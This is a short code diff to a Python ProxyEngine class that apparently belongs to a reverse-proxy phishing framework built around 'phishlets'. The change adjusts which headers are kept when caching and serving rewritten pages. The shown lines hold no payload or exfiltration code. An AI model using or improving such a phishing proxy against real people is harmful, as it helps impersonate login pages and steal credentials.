@@ -202,9 +202,9 @@ class ProxyEngine:
                     text_content = self._rewrite_content(text_content, phishlet)
                     content = text_content.encode(charset)
 
-                # Cache headers
+                # Cache headers (exclude content-type to avoid conflict when serving)
                 resp_headers = {k: v for k, v in resp.headers.items()
-                              if k.lower() not in {'content-encoding', 'content-length', 'transfer-encoding'}}
+                              if k.lower() not in {'content-encoding', 'content-length', 'transfer-encoding', 'content-type'}}
 
                 self._page_cache[cache_key] = CachedPage(
                     url=url,
@@ -333,10 +333,13 @@ class ProxyEngine:
             cached = self._get_cached_page(phishlet_id, f"/{path}")
             if cached:
                 logger.debug(f"Serving cached page for /{phishlet_id}/{path}")
+                # Remove content-type from headers to avoid conflict
+                headers = {k: v for k, v in cached.headers.items()
+                          if k.lower() not in {'content-type', 'content-length'}}
                 response = web.Response(
                     body=cached.content,
                     content_type=cached.content_type,
-                    headers=cached.headers
+                    headers=headers
                 )
                 return response
 
